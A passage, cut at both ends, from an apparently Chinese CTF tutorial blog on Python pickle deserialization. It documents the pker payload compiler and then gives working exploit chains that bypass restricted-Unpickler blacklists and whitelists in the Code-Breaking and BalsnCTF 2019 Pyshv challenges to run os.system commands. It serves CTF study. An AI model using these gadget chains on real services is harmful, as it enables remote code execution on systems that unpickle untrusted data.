e:</span><br><span class="line">        sys.exit(<span class="string">f&quot;[错误] 生成失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------- 格式化输出 ----------------</span></span><br><span class="line">    <span class="keyword">if</span> args.raw:</span><br><span class="line">        out_text = payload.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> args.<span class="built_in">hex</span>:</span><br><span class="line">        out_text = payload.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out_text = <span class="built_in">repr</span>(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.output:</span><br><span class="line">        Path(args.output).write_text(out_text, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(out_text)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pker.py [选项] [文件...]</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="输入优先级"><a href="#输入优先级" class="headerlink" title="输入优先级"></a>输入优先级</h4><ol>
+<li><code>-c/--code</code> → 直接传入一段源码字符串</li>
+<li>文件参数（可多个，依次拼接）</li>
+<li>无参数时：<ul>
+<li>如果 stdin 是管道&#x2F;重定向 → 读 stdin</li>
+<li>否则进入交互模式（两次空行结束输入）</li>
+</ul>
+</li>
+</ol>
+<h4 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h4><table>
+<thead>
+<tr>
+<th>模式</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>源码字符串</strong></td>
+<td><code>pker.py -c &quot;x=1;return x&quot;</code></td>
+<td>直接在命令行传代码</td>
+</tr>
+<tr>
+<td><strong>文件</strong></td>
+<td><code>pker.py payload.py</code></td>
+<td>读取指定源码文件</td>
+</tr>
+<tr>
+<td><strong>多文件</strong></td>
+<td><code>pker.py part1.py part2.py</code></td>
+<td>合并多个文件内容生成</td>
+</tr>
+<tr>
+<td><strong>stdin</strong></td>
+<td>&#96;cat payload.py</td>
+<td>pker.py&#96;</td>
+</tr>
+<tr>
+<td><strong>强制 stdin</strong></td>
+<td><code>pker.py -</code></td>
+<td>不管 TTY 状态，直接读 stdin</td>
+</tr>
+<tr>
+<td><strong>交互模式</strong></td>
+<td><code>pker.py</code></td>
+<td>手动输入，连续两次空行结束</td>
+</tr>
+</tbody></table>
+<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+<th>默认</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--bytes</code></td>
+<td>Python bytes 字面量（<code>b&quot;...&quot;</code>）</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>--raw</code></td>
+<td>原始协议 0 文本（便于直接查看 opcode）</td>
+<td></td>
+</tr>
+<tr>
+<td><code>--hex</code></td>
+<td>十六进制字符串（便于嵌入其他语言）</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>输出可保存到文件：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pker.py payload.py -o out.txt</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="支持的语法"><a href="#支持的语法" class="headerlink" title="支持的语法"></a>支持的语法</h3><p><code>pker</code> 并不是一个完整的 Python 编译器，它只识别并处理一个<strong>受限的语法子集</strong>，并将其转换为对应的 Pickle 协议 0 文本指令。</p>
+<p>支持的值类型：</p>
+<ul>
+<li>基本类型：<code>int</code>、<code>float</code>、<code>str</code>、<code>None</code>、<code>bool</code></li>
+<li>容器类型：<code>list</code>、<code>tuple</code>、<code>dict</code></li>
+<li>变量引用（必须先赋值过）</li>
+</ul>
+<h4 id="赋值（变量会存入-pickle-的-memo-表）"><a href="#赋值（变量会存入-pickle-的-memo-表）" class="headerlink" title="赋值（变量会存入 pickle 的 memo 表）"></a>赋值（变量会存入 pickle 的 <em>memo</em> 表）</h4><table>
+<thead>
+<tr>
+<th>形式</th>
+<th>含义</th>
+<th>生成效果（协议 0）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>x = value</code></td>
+<td>将 <code>value</code> 的结果保存到变量 <code>x</code>（memo 表）</td>
+<td><code>&lt;构造 value 的指令&gt; pN\n0</code> （PUT N，保存到 memo 槽位）</td>
+</tr>
+<tr>
+<td><code>x[i] = value</code></td>
+<td>给容器 <code>x</code> 的下标 <code>i</code> 赋值</td>
+<td><code>g&lt;idx&gt;\n &lt;构造 i&gt; &lt;构造 value&gt; s</code>（GET idx，SETITEM）</td>
+</tr>
+<tr>
+<td><code>x.attr = value</code></td>
+<td>给对象 <code>x</code> 的属性 <code>attr</code> 赋值</td>
+<td><code>g&lt;idx&gt;\n (&#125;(&lt;构造 attr&gt; &lt;构造 value&gt; d t b)</code>（通过 BUILD 更新属性）</td>
+</tr>
+</tbody></table>
+<p>示例：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0</span>]        <span class="comment"># 列表存到 memo</span></span><br><span class="line">a[<span class="number">0</span>] = <span class="number">123</span>     <span class="comment"># 修改下标 0</span></span><br><span class="line">a.attr = <span class="string">&#x27;hi&#x27;</span>  <span class="comment"># 修改属性 attr</span></span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large red">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>注意</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>protocol 0 里也没有“读属性&#x2F;读下标”的专用 opcode，因此通常需要 <code>GLOBAL(&#39;builtins&#39;,&#39;getattr&#39;)(x, &#39;__getitem__&#39;)</code> 来读取。但这在很多题里 <strong><code>builtins</code> 会被禁用</strong>，所以通用性不强。</p>
+<p>因此这里 <code>pker</code> 不支持下标读取的语法：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">globals</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>)()</span><br><span class="line">builtins = <span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>] <span class="comment"># ❌ 不支持读下标</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">getattr</span>(builtins,<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+    </div>
+  </div>
+
+<h4 id="函数调用-1"><a href="#函数调用-1" class="headerlink" title="函数调用"></a>函数调用</h4><p>普通函数调用语法如下，其中 <code>func</code> 必须是已赋值过的变量。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func(a, b)</span><br></pre></td></tr></table></figure></div>
+
+<p>上述代码会被转换为 <code>g&lt;func_idx&gt;\n (&lt;构造 a&gt; &lt;构造 b&gt; t R)</code>（GET 函数 → 压参数 → TUPLE → REDUCE 调用）</p>
+<p>另外 pker 还支持嵌套调用：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f()()</span><br><span class="line">GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;id&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>pker 会先生成外层调用结果，再将结果作为可调用对象继续生成调用指令。</p>
+<h4 id="return（顶层可用）"><a href="#return（顶层可用）" class="headerlink" title="return（顶层可用）"></a>return（顶层可用）</h4><table>
+<thead>
+<tr>
+<th>形式</th>
+<th>生成效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>return</code></td>
+<td><code>.</code>（STOP，返回 None）</td>
+</tr>
+<tr>
+<td><code>return expr</code></td>
+<td><code>&lt;构造 expr&gt; .</code>（返回 expr 结果）</td>
+</tr>
+</tbody></table>
+<h3 id="内置宏说明"><a href="#内置宏说明" class="headerlink" title="内置宏说明"></a>内置宏说明</h3><p>内置宏是 <code>pker</code> 特有的保留字，用于快速生成特定的 pickle 指令，这些指令直接映射到协议 0 的“全局对象调用”相关 opcode。</p>
+<h4 id="GLOBAL-module-name"><a href="#GLOBAL-module-name" class="headerlink" title="GLOBAL(module, name)"></a><code>GLOBAL(module, name)</code></h4><p>引用模块中的对象（协议 0：<code>c&#123;module&#125;\n&#123;name&#125;\n</code>）</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system = GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;id&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="INST-module-name-args"><a href="#INST-module-name-args" class="headerlink" title="INST(module, name, *args)"></a><code>INST(module, name, *args)</code></h4><p>实例化对象（协议 0：<code>(&lt;构造 args...&gt; i&#123;module&#125;\n&#123;name&#125;\n</code>）</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj = INST(<span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;Counter&#x27;</span>, [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="OBJ-callable-args"><a href="#OBJ-callable-args" class="headerlink" title="OBJ(callable, *args)"></a><code>OBJ(callable, *args)</code></h4><p>调用可调用对象（协议 0：<code>(&lt;构造 callable&gt; &lt;构造 args...&gt; o</code>）</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = OBJ(GLOBAL(<span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>), <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h1><h2 id="绕过-Restricted-Unpickler"><a href="#绕过-Restricted-Unpickler" class="headerlink" title="绕过 Restricted Unpickler"></a>绕过 Restricted Unpickler</h2><h3 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h3><h4 id="寻找未被限制的利用链"><a href="#寻找未被限制的利用链" class="headerlink" title="寻找未被限制的利用链"></a>寻找未被限制的利用链</h4><p>Code-Breaking picklecode 给出了一个黑名单的场景，源码如下：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">&#x27;PickleSerializer&#x27;</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这道题将 <code>eval</code>，<code>exec</code> 等关键词进行了过滤，这意味着无法直接通过 <code>builtins.eval</code>（即 <code>GLOBAL(builtins, &#39;eval&#39;)</code>）来获取 <code>eval</code> 函数。</p>
+<p>一种方法是通过 <code>builtins.getattr(builtins, &#39;eval&#39;)</code> 进行绕过。然而我们需要先 <code>getattr</code> 的第一个参数 <code>builtins</code> 模块，因为 <code>GLOBAL</code> 只能获取模块中的某个对象，也就是说我们需要从 <code>builtin.globals()</code> 的结果中通过 <code>dict.get</code> 函数获取。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">getattr</span>(<span class="built_in">getattr</span>(GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>),<span class="string">&#x27;get&#x27;</span>)(GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>)(),<span class="string">&#x27;__builtins__&#x27;</span>),<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>另一种比较简便的方式是直接通过 <code>builtins.__getattribute__(&#39;eval&#39;)</code> 获取。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;__getattribute__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="绕过白名单"><a href="#绕过白名单" class="headerlink" title="绕过白名单"></a>绕过白名单</h3><h4 id="模块劫持"><a href="#模块劫持" class="headerlink" title="模块劫持"></a>模块劫持</h4><p>BalsnCTF 2019 Pyshv1 中使用了白名单进行限制。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, io</span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment">## See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(<span class="variable language_">self</span>, module, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"><span class="comment">## server.py</span></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;sys&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><code>securePickle.py</code> 中声明了一个 <code>whitelist</code>， <code>server.py</code> 中将 <code>sys</code> 模块添加到白名单中。也就是说这里只允许加载 <code>sys</code> 模块。</p>
+<p>然而 <code>sys</code> 模块中有一个 <code>modules</code> 字典用来维护已加载模块名称与模块对象的映射，例如当我们调用 <code>GLOBAL(&#39;sys&#39;, &#39;modules&#39;)</code> 实际上会先尝试 <code>modules</code> 的 <code>sys</code> 键对应的值作为模块对象。</p>
+<p>换而言之我们可以先 <code>GLOBAL(&#39;sys&#39;, &#39;modules&#39;)</code> 获取到 <code>sys.modules</code> 并设置 <code>modules[&#39;sys&#39;] = modules</code>，此时 <code>sys.modules</code> 被看做是 <code>sys</code> 模块：</p>
+<ul>
+<li>我们可以通过 <code>GLOBAL(&#39;sys&#39;, &#39;get&#39;)</code> 获取 <code>sys.modules</code> 中的任意模块。尝试发现 <code>os</code> 会随着 <code>sys</code> 一并加载，因此我们可以获取 <code>os</code> 模块。</li>
+<li>将获取的 <code>os</code> 模块覆写到 <code>sys.modules[&#39;sys&#39;]</code>，此时我们可以将 <code>os</code> 模块看做是 <code>sys</code> 模块使用。</li>
+</ul>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modules = GLOBAL(<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;modules&#x27;</span>)</span><br><span class="line">modules[<span class="string">&#x27;sys&#x27;</span>] = modules</span><br><span class="line">modules[<span class="string">&#x27;sys&#x27;</span>] = GLOBAL(<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;get&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> GLOBAL(<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="属性创建与函数劫持"><a href="#属性创建与函数劫持" class="headerlink" title="属性创建与函数劫持"></a>属性创建与函数劫持</h4><p>BalsnCTF 2019 Pyshv2 中白名单只有一个 structs 模块。与 BalsnCTF 2019 Pyshv1 不同的是，BalsnCTF 2019 Pyshv1 中使用了 <code>pickle.Unpickler.find_class(self, module, name)</code> 去寻找类，而这道题中使用的是 <code>__import__</code> 和 <code>getattr</code> 去获取。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment">## See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        module = <span class="built_in">__import__</span>(module)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"><span class="comment">## server.py</span></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;structs&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><code>structs</code> 模块是题目给出的 <code>structs.py</code>，其内容为空。对于 python 中导入的模块，都以通过获取其 <code>__builtins__</code> 属性来获取 <code>builtins</code> 模块对应的字典，获取到这个字典之后，再获取 <code>eval</code> 函数就可以执行任意 python 代码了。目标是构造如下的代码：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">structs.__builtins__[<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
+
+<p>由于需要从字典中取值，因此也需要用到 <code>dict.get</code> 函数，由于这里获取到的 <code>__builtins__</code> 只是一个字典，因此获取 <code>dict.get</code> 函数需要通过 <code>__builtins__[&#39;dict&#39;].get</code> 去获取，再次需要通过字典去索引，这就会陷入死循环。</p>
+<p>跳出这个死循环的关键是如何不通过 <code>__builtins__[&#39;dict&#39;].get</code>  获取 <code>get</code> 函数。因为 <code>__builtins__</code> 本身就是字典，因此这里我们采用现有的 <code>getattr</code> 函数执行 <code>getattr(__builtins__, &#39;get&#39;)</code> 获取。</p>
+<p>注意到白名单校验之后会通过 <code>__import__</code> 函数去导入模块，然后使用 <code>getattr</code> 获取属性。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module = <span class="built_in">__import__</span>(module)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">getattr</span>(module, name)</span><br></pre></td></tr></table></figure></div>
+
+<p>假如我们要通过 <code>getattr(module, name)</code> 获取到 <code>dict.get</code> 函数，就需要 <code>module</code> 的值为 <code>__buitlins__</code> 字典，<code>name</code> 为 <code>get</code>，则上一步 <code>module = __import__(module)</code> 需要获取到 <code>__buitlins__</code> 字典。但 <code>module</code> 的值仅能为 <code>structs</code>，因此正常情况下无法获取。</p>
+<p>但 pickle 在反序列化时是可以进行全局覆盖的，如果将 <code>__import__</code> 覆盖成 <code>__getattribute__</code>, 则在执行 <code>module = __import__(module)</code> 时，相当于执行：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module = structs.__getattribute__(<span class="string">&#x27;structs&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>此时会获取 <code>structs</code> 模块的 <code>structs</code> 属性。因此这里需要将 <code>structs.structs</code> 赋值为 <code>__buitlins__</code> 字典。但由于 <code>structs.structs</code> 从未声明过，因此不可以直接使用 <code>GLOBAL(&#39;structs&#39;, &#39;structs&#39;)</code> 这样的形式进行获取，而是需要通过直接给 <code>structs.__dict__[&#39;structs&#39;]</code> 赋值来实现。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__dict__ = GLOBAL(<span class="string">&#x27;structs&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>)</span><br><span class="line">builtins = GLOBAL(<span class="string">&#x27;structs&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">__dict__[<span class="string">&#x27;structs&#x27;</span>] = builtins</span><br></pre></td></tr></table></figure></div>
+
+<p>接着是覆盖 <code>__import__</code> 为 <code>__getattribute__</code>， 然后获取 <code>dict.get</code> 函数。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gtat = GLOBAL(<span class="string">&#x27;structs&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>)</span><br><span class="line">builtins[<span class="string">&#x27;__import__&#x27;</span>] = gtat</span><br><span class="line">builtin_get = GLOBAL(<span class="string">&#x27;structs&#x27;</span>, <span class="string">&#x27;get&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>获取到 <code>dict.get</code> 函数之后，就可以从 <code>__buitlins__</code> 字典获取 <code>eval</code> 函数了。最终 exp 为：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__dict__ = GLOBAL(<span class="string">&#x27;structs&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>)</span><br><span class="line">builtins = GLOBAL(<span class="string">&#x27;structs&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line">gtat = GLOBAL(<span class="string">&#x27;structs&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>)</span><br><span class="line">builtins[<span class="string">&#x27;__import__&#x27;</span>] = gtat</span><br><span class="line">__dict__[<span class="string">&#x27;structs&#x27;</span>] = builtins</span><br><span class="line">builtin_get = GLOBAL(<span class="string">&#x27;structs&#x27;</span>, <span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span> = builtin_get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span 